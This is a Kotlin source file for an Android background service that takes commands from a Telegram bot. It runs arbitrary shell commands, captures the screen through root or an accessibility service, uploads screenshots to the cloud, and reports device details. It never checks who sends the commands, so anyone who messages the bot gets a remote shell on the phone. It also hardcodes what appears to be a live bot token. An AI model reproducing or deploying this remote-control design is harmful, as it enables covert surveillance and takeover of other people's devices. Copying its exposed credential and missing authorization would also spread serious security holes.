package com.example.bot

import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.Service
import android.content.Context
import android.content.Intent
import android.content.pm.ServiceInfo
import android.os.Build
import android.os.IBinder
import android.util.Log
import androidx.core.app.NotificationCompat
import com.example.BuildConfig
import com.example.R
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.Job
import kotlinx.coroutines.SupervisorJob
import kotlinx.coroutines.delay
import kotlinx.coroutines.isActive
import kotlinx.coroutines.launch
import java.io.File

class BotService : Service() {

    private val serviceJob = SupervisorJob()
    private val serviceScope = CoroutineScope(Dispatchers.IO + serviceJob)
    
    private lateinit var telegramRepo: TelegramRepository
    private lateinit var cloudRepo: CloudStorageRepository
    private lateinit var commandProcessor: CommandProcessor

    private var lastUpdateId = 0L
    private var lastScreenshot: File? = null

    override fun onCreate() {
        super.onCreate()
        startForegroundService()

        val sharedPrefs = getSharedPreferences("BotPrefs", Context.MODE_PRIVATE)
        val token = sharedPrefs.getString("TELEGRAM_BOT_TOKEN", "8629620673:AAGh-E5q2paQUvWjExgH4Jx0Rw4ShVWaFM8") ?: ""
        if (token.isEmpty() || token == "YOUR_TELEGRAM_BOT_TOKEN") {
            Log.e("BotService", "Telegram Bot Token is not configured.")
            return
        }

        telegramRepo = TelegramRepository(token)
        cloudRepo = CloudStorageRepository()
        commandProcessor = CommandProcessor(this)

        startPolling()
    }

    private fun startForegroundService() {
        val channelId = getString(R.string.bot_service_channel_id)
        val channelName = getString(R.string.bot_service_channel_name)

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val channel = NotificationChannel(
                channelId,
                channelName,
                NotificationManager.IMPORTANCE_LOW
            )
            val manager = getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager
            manager.createNotificationChannel(channel)
        }

        val notification: Notification = NotificationCompat.Builder(this, channelId)
            .setContentTitle("Cloud Screenshot Bot")
            .setContentText("Bot is running in background")
            .setSmallIcon(R.mipmap.ic_launcher)
            .build()

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
            startForeground(1, notification, ServiceInfo.FOREGROUND_SERVICE_TYPE_SPECIAL_USE)
        } else {
            startForeground(1, notification)
        }
    }

    private fun startPolling() {
        serviceScope.launch {
            while (isActive) {
                try {
                    val updates = telegramRepo.getUpdates(lastUpdateId + 1)
                    for (i in 0 until updates.length()) {
                        val update = updates.getJSONObject(i)
                        val updateId = update.getLong("update_id")
                        lastUpdateId = updateId

                        if (update.has("message")) {
                            val message = update.getJSONObject("message")
                            if (message.has("text")) {
                                val text = message.getString("text")
                                val chatId = message.getJSONObject("chat").getLong("id")
                                handleCommand(chatId, text)
                            }
                        }
                    }
                } catch (e: Exception) {
                    Log.e("BotService", "Polling error", e)
                }
                delay(2000) // Poll every 2 seconds as requested
            }
        }
    }

    private suspend fun handleCommand(chatId: Long, text: String) {
        val parts = text.split(" ")
        val command = parts[0].lowercase()
        val sharedPrefs = getSharedPreferences("BotPrefs", Context.MODE_PRIVATE)
        val deviceName = sharedPrefs.getString("DEVICE_ID", Build.MODEL) ?: Build.MODEL

        when (command) {
            "/ping" -> {
                telegramRepo.sendMessage(chatId, "Online - $deviceName")
            }
            "/battery" -> {
                telegramRepo.sendMessage(chatId, "[$deviceName] " + commandProcessor.getBatteryLevel())
            }
            "/storage" -> {
                telegramRepo.sendMessage(chatId, "[$deviceName] " + commandProcessor.getStorageInfo())
            }
            "/device" -> {
                telegramRepo.sendMessage(chatId, "[$deviceName] " + commandProcessor.getDeviceInfo())
            }
            "/cmd", "/shell" -> {
                val cmdToExecute = text.removePrefix(parts[0]).trim()
                if (cmdToExecute.isNotEmpty()) {
                    val result = commandProcessor.executeShellCommand(cmdToExecute)
                    telegramRepo.sendMessage(chatId, "[$deviceName] Result:\n$result")
                } else {
                    telegramRepo.sendMessage(chatId, "Please provide a command. Example: /cmd ls -l")
                }
            }
            "/screenshot" -> {
                telegramRepo.sendMessage(chatId, "[$deviceName] Taking screenshot...")
                val file = ScreenshotUtil.takeScreenshot(this@BotService)
                if (file != null && file.exists()) {
                    lastScreenshot = file
                    telegramRepo.sendPhoto(chatId, file, "Screenshot captured from $deviceName.")
                } else {
                    val rootMethod = ScreenshotUtil.isRootAvailable()
                    val accessibilityMethod = ScreenshotAccessibilityService.instance != null
                    telegramRepo.sendMessage(chatId, "[$deviceName] Failed to capture screenshot.\nRoot Available: $rootMethod\nAccessibility Service Running: $accessibilityMethod\nPlease enable Accessibility Service in Settings or grant root access.")
                }
            }
            "/upload" -> {
                val fileToUpload = lastScreenshot
                if (fileToUpload != null && fileToUpload.exists()) {
                    telegramRepo.sendMessage(chatId, "Uploading...")
                    val url = cloudRepo.uploadFile(fileToUpload)
                    if (url != null) {
                        telegramRepo.sendMessage(chatId, "Uploaded successfully:\n$url")
                    } else {
                        telegramRepo.sendMessage(chatId, "Upload failed.")
                    }
                } else {
                    telegramRepo.sendMessage(chatId, "No recent screenshot available to upload.")
                }
            }
            "/delete" -> {
                val fileToDelete = lastScreenshot
                if (fileToDelete != null && fileToDelete.exists()) {
                    val deleted = fileToDelete.delete()
                    if (deleted) {
                        lastScreenshot = null
                        telegramRepo.sendMessage(chatId, "Local screenshot deleted.")
                    } else {
                        telegramRepo.sendMessage(chatId, "Failed to delete file.")
                    }
                } else {
                    telegramRepo.sendMessage(chatId, "No recent screenshot found to delete.")
                }
            }
            "/help", "/start" -> {
                val helpMsg = """
                    Available commands for [$deviceName]:
                    /ping - Check if bot is online
                    /battery - Get battery level
                    /storage - Get storage info
                    /device - Get device info
                    /cmd <command> - Execute a shell command
                    /screenshot - Capture screen
                    /upload - Upload the last screenshot to cloud
                    /delete - Delete the last screenshot from local storage
                    /help - Show this help message
                """.trimIndent()
                telegramRepo.sendMessage(chatId, helpMsg)
            }
            else -> {
                // Ignore unknown commands
            }
        }
    }

    override fun onBind(intent: Intent?): IBinder? = null

    override fun onDestroy() {
        super.onDestroy()
        serviceJob.cancel()
    }
}
